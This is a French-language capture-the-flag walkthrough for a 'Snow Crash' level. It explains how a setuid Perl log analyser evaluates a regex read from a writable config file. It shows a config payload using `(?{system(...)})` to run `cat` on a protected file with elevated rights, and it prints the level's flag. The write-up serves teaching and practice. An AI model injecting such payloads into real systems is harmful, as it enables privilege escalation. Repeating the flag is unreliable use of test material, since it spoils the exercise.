# Level06 — Perl et expressions régulières

**Point de départ :** une session sur la VM Snow Crash sous `level06`. Le flag de ce niveau sert de mot de passe au compte `level07`.

## Objectif

Nous sommes connectés en tant que `level06`. Notre objectif est de récupérer le secret situé dans `/home/flag06/.flag`, afin de passer au niveau suivant. Nous ne pouvons pas le lire directement : il faut trouver un programme qui peut le lire pour nous.

Dans ce niveau, nous allons découvrir qu’un fichier de configuration (un fichier de réglages) peut contenir du code exécuté par un programme ayant plus de droits que nous.

## 1. Trouver le programme

```bash
cat README
```

Résultat de référence (à confirmer sur la VM) :

```text
Nothing passes through the Raven unread.
```

Rechercher les fichiers associés à `Raven` dans le dossier du niveau :

```bash
find /opt/snowcrash/level06 -maxdepth 3 -ls
```

Fichiers à rechercher :

```text
/opt/snowcrash/level06/raven
/opt/snowcrash/level06/raven.pl
```

Le premier est l’exécutable à lancer. Le second est un script Perl lisible qui permet d’étudier le traitement réalisé. Perl est un langage de programmation, comme Python ou C. Raven analyse des logs, c’est-à-dire des fichiers qui enregistrent les événements de la machine.

## 2. Examiner les permissions

```bash
id
ls -l /etc/raven/raven.conf
ls -l /opt/snowcrash/level06/raven
```

`id` permet de connaître notre utilisateur et ses groupes. `ls -l` permet de voir les propriétaires et les permissions des fichiers. Nous cherchons à savoir si nous pouvons modifier les réglages de Raven et avec quels droits Raven s’exécute.

Vérifier les conditions suivantes :

- `level06` appartient au groupe `raven` ;
- ce groupe peut modifier `/etc/raven/raven.conf` ;
- l’exécutable `raven` appartient à `flag06` et possède le bit setuid.

Le bit setuid est visible par un `s` dans les permissions du propriétaire. Lors de l’exécution d’un binaire setuid, son UID effectif peut devenir celui de son propriétaire, sous réserve des restrictions du système.

Il faut vérifier que Raven s’exécute effectivement sous `flag06` et que les privilèges sont conservés lors de l’exécution du script Perl et des commandes externes.

Référence complémentaire : [execve(2)](https://man7.org/linux/man-pages/man2/execve.2.html).

Le chemin de `raven.conf` et les permissions exactes restent à confirmer.

## 3. Lire le script Perl

```bash
cat /opt/snowcrash/level06/raven.pl
```

Instructions à rechercher dans le script :

```perl
use re 'eval';
```

et l’évaluation d’un motif provenant de la configuration :

```perl
$line =~ /$pattern/
```

Une expression régulière, ou *regex*, décrit un motif à rechercher dans du texte. Par exemple, si un journal contient `INFO: démarrage` et `ERROR: connexion impossible`, nous pouvons rechercher le mot `ERROR` pour identifier les erreurs. En Perl :

```perl
$line =~ /ERROR/
```

Cette expression vérifie si `$line` (la ligne du journal) contient le mot `ERROR`. L’opérateur `=~` applique l’expression régulière à cette ligne. Dans Raven, `$pattern` est lu dans le fichier de configuration modifiable par `level06`. Le réglage `loglevel_pattern` nous permet donc de choisir le motif recherché.

Référence complémentaire : [tutoriel Perl sur les expressions régulières](https://perldoc.perl.org/perlretut).

## 4. Comprendre l’exécution de code dans la regex

La directive `use re 'eval';` autorise l’évaluation de code dans certains motifs dynamiques.

La [documentation officielle de re](https://perldoc.perl.org/re) explique que cette option autorise notamment du code dans un motif fourni par une variable. La [documentation perlre](https://perldoc.perl.org/perlre) décrit la syntaxe suivante :

```perl
(?{ code Perl })
```

Le code placé entre les accolades est exécuté pendant l’évaluation du motif. La directive `use re 'eval'` autorise ce mécanisme pour un motif construit dynamiquement.

Exemple Perl indépendant de Raven (à exécuter dans un fichier avec l’interpréteur Perl) :

```perl
use re 'eval';
my $pattern = q{(?{ print "Test OK\n" })};
my $line = "INFO: service started";
$line =~ /$pattern/;
```

`my` déclare une variable, `q{...}` conserve le texte du motif, et la dernière ligne applique ce motif. La sortie attendue est `Test OK`, ce qui indiquerait que l’évaluation du motif a exécuté une instruction.

La vulnérabilité vient de la combinaison suivante :

```text
configuration contrôlée par level06
                │
                ▼
 motif dynamique avec (?{ ... })
                │
                ▼
  use re 'eval' autorise son exécution
                │
                ▼
 Raven l’évalue avec les droits de flag06
```

## 5. Comprendre le rôle de la rétention

Réglage initial à confirmer dans la configuration :

```ini
retention_days = 7
```

La rétention est la durée pendant laquelle les journaux sont pris en compte, exprimée ici en jours. Raven ignore les journaux trop anciens. Sortie de référence à comparer à l’exécution avec la configuration d’origine :

```text
Total lines: 0
Skipped files: 2
```

L’exécution du motif nécessite au moins une ligne de journal traitée. Si la rétention initiale produit `Total lines: 0`, il faut l’élargir pour que le motif soit évalué.

La valeur `9999` élargit la période de rétention ; vérifier qu’elle inclut effectivement les journaux disponibles.

## 6. Modifier la configuration

La fonction Perl `system` lance une commande externe ([documentation](https://perldoc.perl.org/functions/system)).

Le réglage du motif contient donc une instruction Perl, qui demande à son tour de lancer `cat`. Vérifier que le dossier des journaux est celui de la configuration initiale et que la rétention élargie permet de traiter des lignes.

Installer la configuration de test :

```bash
cat > /etc/raven/raven.conf <<'EOF'
log_dir = /var/log/snowcrash
retention_days = 9999
loglevel_pattern = (?{system('/bin/cat /home/flag06/.flag')})
EOF
```

| Réglage | Rôle |
| --- | --- |
| `log_dir` | Indiquer le dossier contenant les journaux à analyser. |
| `retention_days` | Autoriser le traitement des journaux anciens du niveau. |
| `loglevel_pattern` | Fournir le motif évalué par Perl. |
| `system(...)` | Demander à Perl de lancer la commande externe `cat`. |

Les apostrophes autour de `EOF` empêchent le shell de transformer le contenu avant son écriture.

## 7. Exécuter Raven

```bash
/opt/snowcrash/level06/raven
```

Si Raven traite les lignes avec le motif modifié et conserve les privilèges nécessaires, `cat` doit afficher le secret. Flag de référence :

```text
wizelohxamaiuiia2uinaes4a
```
